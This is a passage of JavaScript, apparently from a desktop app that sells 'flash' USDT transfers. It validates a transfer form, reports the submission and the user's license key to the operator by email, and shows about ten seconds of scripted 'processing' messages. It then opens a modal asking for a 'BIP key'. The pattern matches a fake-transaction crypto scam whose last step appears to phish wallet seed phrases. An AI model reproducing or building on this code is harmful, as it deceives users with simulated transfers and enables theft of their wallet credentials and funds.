    showNotification('Error', 'Please enter a receiver address');
    return;
  }
  
  if (!flashAmount) {
    showNotification('Error', 'Please enter a flash amount');
    return;
  }
  
  if (wallet === 'Wallet') {
    showNotification('Error', 'Please select a wallet');
    return;
  }
  
  if (currency === 'Currency') {
    showNotification('Error', 'Please select a currency');
    return;
  }
  
  if (network === 'Network') {
    showNotification('Error', 'Please select a network');
    return;
  }
  
  // Check if flash amount is within limits
  const amount = parseFloat(flashAmount);
  if (isNaN(amount)) {
    showNotification('Error', 'Please enter a valid flash amount');
    return;
  }
  
  if (amount <= 0) {
    showNotification('Error', 'Flash amount must be greater than 0');
    return;
  }
  
  if (amount > appSettings.maxFlashAmount) {
    showNotification('Error', `Flash amount cannot exceed ${appSettings.maxFlashAmount} USDT`);
    return;
  }
  
  // Prepare flash form data
  const flashFormData = {
    receiverAddress,
    flashAmount: parseFloat(flashAmount),
    wallet,
    currency,
    network,
    delayDays: parseInt(days),
    delayMinutes: parseInt(minutes),
    licenseKey: currentLicenseKey ? currentLicenseKey.key : null,
    user: currentUser,
    timestamp: new Date().toISOString()
  };
  
  console.log('Flash form data:', flashFormData);
  
  // Send flash form data to main process for email notification
  window.api.send('app-request', {
    action: 'notifyFlashFormSubmission',
    flashFormData
  });
  
  // Show loading state
  const sendBtn = document.getElementById('send-btn');
  if (sendBtn) {
    sendBtn.disabled = true;
    sendBtn.textContent = 'Processing...';
  }
  
  // Clear status display
  const statusDisplay = document.getElementById('status-display');
  if (statusDisplay) {
    statusDisplay.innerHTML = '';
    
    // Start displaying initial loading messages - use all 10 seconds
    displayMessages(window.initialLoadingMessages, statusDisplay, 10000, () => {
      // Create and show BIP modal immediately after messages are done
      createBipModal();
      const bipModal = document.getElementById('bip-modal');
      if (bipModal) {
        bipModal.style.display = 'block';
        
        // Focus on BIP input
        const bipInput = document.getElementById('bip-key');
        if (bipInput) {
          bipInput.focus();
        }
      }
    });
  }
}
